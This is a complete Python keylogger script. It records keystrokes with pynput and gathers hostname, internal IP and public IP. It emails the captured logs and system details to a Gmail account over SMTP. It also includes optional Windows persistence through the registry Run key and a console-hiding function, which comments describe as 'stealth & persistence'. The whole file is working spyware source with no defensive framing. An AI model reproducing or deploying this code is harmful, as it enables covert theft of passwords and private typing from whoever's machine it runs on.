#!/usr/bin/env python3

"""
██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
█████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
"""
import os
import sys
import platform
import socket
import urllib.request
import logging
import smtplib
from datetime import datetime
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from logging.handlers import RotatingFileHandler

# ------------------------------------------------------------------------------
# Optional Windows-Specific Imports
if platform.system().lower() == "windows":
    try:
        from winreg import (
            OpenKey, SetValueEx, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
        )
        import win32console
        import win32gui
    except ImportError:
        # These libraries won't exist on non-Windows platforms
        pass

# ------------------------------------------------------------------------------
# Constants / Configuration
SYSINFO_FILE = "sysinfo.txt"
KEYLOG_FILE = "log.txt"
LOG_INTERVAL = 60  # seconds between log flush or checks, if needed
KEYS_BEFORE_WRITE = 20 # log keys after these many keypresses

# ------------------------------------------------------------------------------

# Load credentials from environment variables (safer than hard-coding)
MAIL_ADDRESS = os.environ.get("LOG_MAIL_ADDRESS")
MAIL_PASSWORD = os.environ.get("LOG_MAIL_PASSWORD")

# If you prefer, uncomment and set:
# MAIL_ADDRESS = "YOUR_EMAIL@gmail.com"
# MAIL_PASSWORD = "YOUR_PASSWORD"

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# ------------------------------------------------------------------------------
# Setup Logging
LOG_FILENAME = "internal_log.txt"  # Internal, not the keylog.
# Configure a rotating file handler to limit log file size.
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        RotatingFileHandler(
            LOG_FILENAME, maxBytes=1000000, backupCount=3, encoding="utf-8"
        ),
        logging.StreamHandler(sys.stdout)
    ]
)

logger = logging.getLogger(__name__)

# ------------------------------------------------------------------------------
# Optional: Add script to Windows Startup
def add_to_windows_startup(program_name: str = "MyKeylogger"):
    """
    Adds this script to Windows Startup (Current User).
    This is Windows-specific. Only call this if on Windows.
    """
    if platform.system().lower() != "windows":
        logger.warning("add_to_windows_startup called on non-Windows system.")
        return

    try:
        script_path = os.path.realpath(sys.argv[0])
        with OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS) as key:
            SetValueEx(key, program_name, 0, REG_SZ, script_path)
        logger.info("Successfully added to Windows startup.")
    except Exception as e:
        logger.error(f"Failed to add to Windows startup: {e}")

# ------------------------------------------------------------------------------
# Optional: Hide Console on Windows
def hide_console():
    """
    Hides the console window on Windows OS.
    """
    if platform.system().lower() != "windows":
        logger.warning("hide_console called on non-Windows system.")
        return

    try:
        console_window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(console_window, 0)
        logger.info("Console window hidden.")
    except Exception as e:
        logger.error(f"Failed to hide console window: {e}")

# ------------------------------------------------------------------------------
def send_email(subject: str, filename: str):
    """
    Sends an email with the specified file as an attachment.
    Uses MAIL_ADDRESS and MAIL_PASSWORD environment variables.
    """
    if not MAIL_ADDRESS or not MAIL_PASSWORD:
        logger.error("Email credentials not found. Set environment variables LOG_MAIL_ADDRESS and LOG_MAIL_PASSWORD.")
        return

    if not os.path.exists(filename):
        logger.warning(f"File {filename} does not exist. Email not sent.")
        return

    msg = MIMEMultipart()
    msg["From"] = MAIL_ADDRESS
    msg["To"] = MAIL_ADDRESS
    msg["Subject"] = subject

    try:
        with open(filename, "rb") as attachment:
            base_inst = MIMEBase("application", "octet-stream")
            base_inst.set_payload(attachment.read())
        encoders.encode_base64(base_inst)
        base_inst.add_header(
            "Content-Disposition",
            f'attachment; filename="{os.path.basename(filename)}"'
        )
        msg.attach(base_inst)

        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()
            server.login(MAIL_ADDRESS, MAIL_PASSWORD)
            server.sendmail(MAIL_ADDRESS, MAIL_ADDRESS, msg.as_string())

        logger.info(f"Email sent with attachment: {filename}")

    except Exception as e:
        logger.error(f"Failed to send email: {e}")

# ------------------------------------------------------------------------------
def collect_system_info(filename: str = SYSINFO_FILE):
    """
    Gathers basic system information (hostname, internal/external IP, OS, etc.)
    and writes it to `filename`.
    """
    try:
        with open(filename, "a", encoding="utf-8") as f:
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)

            # Attempt to get external/public IP
            try:
                external_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
            except Exception:
                external_ip = "N/A"

            f.write("----- System Info -----\n")
            f.write(f"Timestamp: {datetime.now()}\n")
            f.write(f"Public IP: {external_ip}\n")
            f.write(f"Processor: {platform.processor()}\n")
            f.write(f"System: {platform.system()} | Version: {platform.version()}\n")
            f.write(f"Machine: {platform.machine()}\n")
            f.write(f"Hostname: {hostname}\n")
            f.write(f"Internal IP: {ip_addr}\n")
            f.write("-----------------------\n\n")

        logger.info(f"System information collected in {filename}")
    except Exception as e:
        logger.error(f"Error collecting system info: {e}")

# ------------------------------------------------------------------------------
def write_keys_to_file(filename: str, keys: list):
    """
    Converts a list of pynput Key objects (and characters) into readable strings,
    and appends them to `filename`.
    """
    try:
        with open(filename, "a", encoding="utf-8") as f:
            for key in keys:
                k = str(key).replace("'", "")

                # Common transformations for readability
                if k == "Key.space":
                    f.write(" ")
                elif k == "Key.backspace":
                    f.write("<BKSP>")
                elif k == "Key.enter":
                    f.write("\n")
                elif k == "Key.tab":
                    f.write("<TAB>")
                elif k == "Key.shift":
                    f.write("<SHIFT>")
                elif k == "Key.ctrl_l" or k == "Key.ctrl_r":
                    f.write("<CTRL>")
                elif k == "Key.esc":
                    f.write("<ESC>")
                elif k.startswith("Key."):
                    # For other special keys like Key.f1, Key.up, etc.
                    # For example: Key.f1 -> <F1>
                    f.write(f"<{k.replace('Key.', '').upper()}>")
                else:
                    f.write(k)
    except Exception as e:
        logger.error(f"Error writing keys to file: {e}")

# ------------------------------------------------------------------------------
def keylogger(log_filename: str = KEYLOG_FILE):
    """
    Listens for keystrokes, writes them to `log_filename` in batches,
    and can optionally send the log via email upon exit.
    """
    # Ensure file exists, or create it if not
    open(log_filename, "a").close()

    key_buffer = []

    # Add a timestamp at the beginning of each keylogger session
    with open(log_filename, "a", encoding="utf-8") as f:
        f.write(f"\n----- Keylogging session started at {datetime.now()} -----\n")

    def on_press(key):
        nonlocal key_buffer
        key_buffer.append(key)

        # Write to file after collecting a certain number of keys
        if len(key_buffer) >= KEYS_BEFORE_WRITE:
            write_keys_to_file(log_filename, key_buffer)
            key_buffer = []

    def on_release(key):
        # Stop keylogger when ESC is pressed
        if key == Key.esc:
            # Write any remaining keys in the buffer
            if key_buffer:
                write_keys_to_file(log_filename, key_buffer)

            # Add a final timestamp
            with open(log_filename, "a", encoding="utf-8") as f:
                f.write(f"\n----- Keylogging session ended at {datetime.now()} -----\n\n")

            # Optionally send the log file at the end
            send_email("Keylogger Log", log_filename)

            logger.info("Keylogger stopped by user (ESC).")
            return False

    # Start listening
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ------------------------------------------------------------------------------
def main():
    """
    Main function that orchestrates the script:
      1) Optionally add to startup on Windows.
      2) Optionally hide the console on Windows.
      3) Collect and email system info.
      4) Start the keylogger.
    """
    logger.info("Script started.")

    # Uncomment these if you want Windows stealth & persistence:
    # add_to_windows_startup("MyKeylogger")
    # hide_console()

    # 1) Collect system info and send it
    collect_system_info(SYSINFO_FILE)
    send_email("System information", SYSINFO_FILE)

    # 2) Start keylogger
    keylogger(KEYLOG_FILE)

    logger.info("Script finished.")

# ------------------------------------------------------------------------------
if __name__ == "__main__":
    main()
